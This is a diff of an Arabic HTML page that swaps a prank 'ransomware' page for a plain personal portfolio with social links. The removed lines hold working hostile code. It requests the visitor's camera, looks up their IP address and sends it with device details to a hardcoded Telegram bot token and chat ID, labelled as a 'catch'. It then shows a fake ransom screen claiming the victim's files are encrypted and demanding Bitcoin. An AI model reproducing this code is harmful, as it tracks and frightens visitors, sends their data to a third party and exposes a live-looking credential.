@@ -2,139 +2,156 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TERMINAL ACCESS | SECURE-IQ</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ALI | Digital Portfolio</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; touch-action: none; }
-        
-        /* 1. شاشة القفل */
-        #VAULT_DOOR {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 20000; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; text-align: center; padding: 20px;
+        :root {
+            --primary: #00ffcc; /* لون فسفوري */
+            --bg: #050505;
         }
-        .key-input { background: #050505; border: 2px solid #0f0; color: #0f0; padding: 15px; text-align: center; width: 80%; font-size: 22px; box-shadow: 0 0 15px #0f0; }
-        .btn-lock { background:#0f0; color:#000; margin-top:25px; padding:15px 50px; border:none; font-weight:bold; font-size: 18px; cursor:pointer; }
 
-        /* 2. واجهة الرادار (مخفية) */
-        #MAIN_INTERFACE { display: none; height: 100vh; position: relative; padding: 15px; box-sizing: border-box; }
-        .panel { padding: 15px; border: 1px solid #f00; background: rgba(20,0,0,0.8); box-shadow: 0 0 20px red; text-align: center; }
-        #scanner { width: 140px; height: 140px; border: 3px solid #f00; border-radius: 50%; margin: 0 auto 15px auto; position: relative; overflow: hidden; display: none; }
-        #v-stream { width: 100%; height: 100%; object-fit: cover; filter: grayscale(1) contrast(3); }
-        .laser { position: absolute; width: 100%; height: 4px; background: #f00; animation: scan 0.8s infinite linear; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        .btn-exe { background: #f00; color: #fff; border: none; padding: 20px; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 20px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+        body {
+            margin: 0;
+            background-color: var(--bg);
+            color: #fff;
+            font-family: 'Cairo', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
 
-        /* 3. شاشة الفدية المعدلة لتناسب الموبايل */
-        #RANSOM_SCREEN {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(140,0,0,0.98); z-index: 30000; color: #fff;
-            flex-direction: column; align-items: center; justify-content: center; text-align: center; 
-            padding: 10px; box-sizing: border-box; font-family: 'Cairo', sans-serif;
-            overflow-y: auto; /* يسمح بالنزول إذا كانت الشاشة صغيرة */
+        /* خلفية متحركة بسيطة */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(45deg, #050505 25%, #0a0a0a 25%, #0a0a0a 50%, #050505 50%, #050505 75%, #0a0a0a 75%, #0a0a0a 100%);
+            background-size: 56.57px 56.57px;
+            z-index: -1;
+            opacity: 0.5;
         }
-        .ransom-icon { font-size: 50px; margin-bottom: 5px; animation: blinker 0.5s infinite; color: #ff0; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        .ransom-title { font-size: 22px; font-weight: 900; margin-bottom: 10px; line-height: 1.2; }
-        .ransom-text { font-size: 14px; font-weight: 700; color: #eee; margin-bottom: 15px; padding: 0 10px; line-height: 1.4; }
-        .ransom-amount { 
-            font-size: 26px; font-weight: 900; color: #ff0; 
-            background: rgba(0,0,0,0.7); padding: 15px; border-radius: 10px;
-            border: 2px dashed #ff0; box-shadow: 0 0 25px #ff0; width: 85%;
+
+        .profile-card {
+            margin-top: 50px;
+            text-align: center;
+            padding: 30px;
+            width: 85%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(0, 255, 204, 0.2);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px rgba(0, 255, 204, 0.1);
         }
-        .ransom-footer { font-size: 10px; color: #ccc; margin-top: 20px; font-family: monospace; padding-bottom: 20px; }
+
+        .profile-img {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 3px solid var(--primary);
+            padding: 5px;
+            box-shadow: 0 0 20px var(--primary);
+            object-fit: cover;
+        }
+
+        h1 {
+            margin: 15px 0 5px 0;
+            font-size: 28px;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: var(--primary);
+        }
+
+        p.bio {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 25px;
+        }
+
+        .links-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+        }
+
+        .link-btn {
+            display: block;
+            padding: 15px;
+            text-decoration: none;
+            color: #fff;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            font-weight: 700;
+            transition: 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .link-btn:hover {
+            background: var(--primary);
+            color: #000;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 255, 204, 0.3);
+        }
+
+        .skills-section {
+            margin-top: 30px;
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .skill-badge {
+            font-size: 10px;
+            padding: 5px 12px;
+            background: rgba(0, 255, 204, 0.1);
+            border: 1px solid var(--primary);
+            border-radius: 20px;
+            color: var(--primary);
+        }
+
+        footer {
+            margin-top: auto;
+            padding: 20px;
+            font-size: 10px;
+            color: #555;
+        }
     </style>
 </head>
 <body>
 
-    <div id="VAULT_DOOR">
-        <h1 style="color:#f00; text-shadow: 0 0 10px #f00;">SYSTEM LOCKED</h1>
-        <p style="color:#888;">ادخل الرمز السري للمتابعة</p>
-        <input type="password" id="key_in" class="key-input" placeholder="****">
-        <button onclick="unlockVault()" class="btn-lock">دخول</button>
-    </div>
+    <div class="profile-card">
+        <img src="threat.jpg" alt="Ali" class="profile-img">
+        
+        <h1>ALI</h1>
+        <p class="bio">مطور واجهات | صانع محتوى تقني | إمبراطور البرمجة</p>
 
-    <div id="MAIN_INTERFACE">
-        <div style="background:#111; padding:8px; border-bottom:1px solid #f00; font-size:11px; text-align:center;">
-            NODE: <span id="node-name">SEARCHING...</span> | STATUS: <span style="color:red">CONNECTED</span>
+        <div class="skills-section">
+            <span class="skill-badge">HTML/CSS</span>
+            <span class="skill-badge">AI Prompting</span>
+            <span class="skill-badge">Cybersecurity</span>
         </div>
-        <div class="panel" style="margin-top: 15px;">
-            <div id="scanner"><video id="v-stream" autoplay playsinline muted></video><div class="laser"></div></div>
-            <p style="font-size: 12px;">> TARGET_LOC: <span style="color:yellow">IRAQ-WASIT</span></p>
-            <p style="font-size: 12px;">> DEVICE: <span id="d-info">...</span></p>
-            <button class="btn-exe" id="start-btn" onclick="executeOmni()">بدء المزامنة (SYNC) ⚡</button>
-        </div>
-    </div>
 
-    <div id="RANSOM_SCREEN">
-        <div class="ransom-icon">⚠️</div>
-        <div class="ransom-title">تم تشفير جميع ملفاتك بنجاح!</div>
-        <div class="ransom-text">
-            لقد تم قفل جهازك وسحب كافة بياناتك الخاصة (الصور، الفيديوهات، الحسابات).<br>
-            لا تحاول إغلاق المتصفح، وإلا سيتم حذف البيانات نهائياً.
-        </div>
-        <div class="ransom-amount">
-            الفدية المطلوبة:<br>
-            5 مليار دولار أمريكي
-        </div>
-        <div class="ransom-footer">
-            لديك 24 ساعة فقط للدفع عبر Bitcoin.<br>
-            TIME REMAINING: 23:59:59
+        <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.1); margin: 25px 0;">
+
+        <div class="links-container">
+            <a href="https://tiktok.com/@your_user" class="link-btn" target="_blank">le_dr313</a>
+            <a href="https://instagram.com/your_user" class="link-btn" target="_blank">drb7w</a>
+            <a href="https://github.com/drb7w" class="link-btn" target="_blank">مستودع الأكواد (GitHub) 💻</a>
+            <a href="mailto:your@email.com" class="link-btn">تواصل معي ✉️</a>
         </div>
     </div>
 
-    <audio id="sfx-alarm" src="https://actions.google.com/sounds/v1/alarms/emergency_it_is_vibration.ogg" loop></audio>
+    <footer>
+        DESIGNED BY ALI © 2026 | WASIT, IRAQ
+    </footer>
 
-    <script>
-        const MASTER_KEY = "0777F"; 
-        const TG_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; 
-        const TG_ID = "7772577035"; 
-
-        function unlockVault() {
-            let val = document.getElementById('key_in').value;
-            if(val === MASTER_KEY) {
-                sessionStorage.setItem('unlocked', 'true');
-                showInterface();
-            } else {
-                alert("ACCESS DENIED");
-                location.reload();
-            }
-        }
-
-        function showInterface() {
-            document.getElementById('VAULT_DOOR').style.display = "none";
-            document.getElementById('MAIN_INTERFACE').style.display = "block";
-            document.getElementById('d-info').innerText = navigator.platform;
-            document.getElementById('node-name').innerText = "V-" + Math.floor(Math.random()*9999);
-        }
-
-        async function executeOmni() {
-            document.getElementById('sfx-alarm').play();
-            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('scanner').style.display = "block";
-                document.getElementById('v-stream').srcObject = stream;
-            } catch(e) { }
-
-            // إرسال التقرير للتلجرام
-            let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Protected"}));
-            let msg = `🔥 **صيد جديد v1400**\n🌐 IP: \`${ip.ip}\`\n📱 الجهاز: \`${navigator.platform}\`\nالضحية استلمت طلب الفدية!`;
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-
-            // إظهار شاشة الفدية بعد 3 ثواني
-            setTimeout(() => {
-                document.getElementById('RANSOM_SCREEN').style.display = "flex";
-                document.body.style.background = "#800";
-            }, 3000);
-        }
-
-        window.onload = function() {
-            if(sessionStorage.getItem('unlocked') === 'true') showInterface();
-        }
-    </script>
 </body>
 </html>
